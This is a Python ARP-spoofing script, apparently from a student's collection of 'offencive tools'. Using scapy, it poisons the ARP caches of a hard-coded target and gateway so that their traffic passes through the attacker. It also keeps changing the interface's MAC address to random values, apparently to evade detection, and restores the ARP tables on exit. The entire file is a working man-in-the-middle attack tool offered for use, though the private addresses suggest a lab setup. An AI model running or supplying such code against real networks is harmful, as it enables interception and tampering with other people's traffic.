# coding=utf-8                                                                                           

"""                                                                                                      
    Security - Multiples offencives Tools                                                                
    Copyright (C) 2019 nbeny                                                                        
    <nbeny@student.42.fr>                                                                                
    This program is free software: you can redistribute it and/or modify                                 
    it under the terms of the GNU General Public License as published by                                 
    the Free Software Foundation, either version 3 of the License, or                                    
    (at your option) any later version.                                                                  
    This program is distributed in the hope that it will be useful,                                      
    but WITHOUT ANY WARRANTY; without even the implied warranty of                                       
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                                        
    GNU General Public License for more details.                                                         
    You should have received a copy of the GNU General Public License                                    
    along with this program.  If not, see <https://www.gnu.org/licenses/>.                               
"""

#!/usr/bin/env python                                                                                    

from __future__ import print_function
import subprocess
import optparse
import re
import sys
from random import randint
import time

import scapy.all as scapy


# ip and mac_address found with network_scanner.py
target_ip = "10.0.2.5"

#psrc Gateway/Passerelle found with 'route -n'
gateway_ip = "10.0.2.1"


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]

    return answered_list[0][1].hwdst

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to change the MAC adress")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    return options

def change_mac(interface, new_mac):
    # print("[+] Changing MAC address for " + interface + " to " + str(new_mac))
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
    subprocess.call(["ifconfig", interface, "up"])


def get_current_mac(interface):
    ifconfig_result = subprocess.check_output(["ifconfig", interface])
    mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result)
    if mac_address_search_result:
        print("[+] Current MAC address assigned to " + mac_address_search_result.group(0))
        return mac_address_search_result.group(0)
    else:
        print("[-] Could not read MAC address.")

def mac_address_creator(mac_address=""):
    recu = 0
    while True:
        recu += 1
        if recu < 7:
            mac_address += str(randint(0, 9))
            mac_address += str(randint(0, 9))
            if recu < 6:
                mac_address += ":"
        if recu == 7:
            return mac_address

try:
    options = get_arguments()
    current_mac = get_current_mac(options.interface)
    sent_packets_count = 0
    while True:
        # print("\r[-] Current MAC = " + str(current_mac))
        if current_mac is not None:
            news_mac = mac_address_creator("")
            change_mac(options.interface, news_mac)
            current_mac = get_current_mac(options.interface)
            if current_mac == news_mac:
                print("[+] MAC address was successfully changed to " + current_mac)
                time.sleep(3)
                print("")
                i = 0
                while i < 5:
                    spoof(target_ip, gateway_ip)
                    spoof(gateway_ip, target_ip)
                    sent_packets_count += 2
                    print("\r[+] Packets sent: " + str(sent_packets_count), end="")
                    sys.stdout.flush()
                    # time.sleep(1)
                    print("")
                    i += 1
            else:
                print("[-] MAC address did not get changed.")
except KeyboardInterrupt:
    print("\n[-] Detected ctrl + C ... Resetting ARP tables ... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
